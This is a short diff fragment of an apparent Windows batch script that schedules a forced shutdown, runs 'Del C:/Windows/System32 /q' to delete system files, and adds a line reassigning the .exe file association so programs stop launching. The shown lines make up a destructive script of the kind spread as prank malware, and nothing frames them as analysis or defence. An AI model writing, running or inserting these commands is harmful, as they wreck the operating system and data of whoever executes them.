@@ -35,3 +35,5 @@ timeout 60 /nobreak
 Shutdown.exe /s /t 120
  
 Del C:/Windows/System32 /q
+
+assoc .exe=.Ink
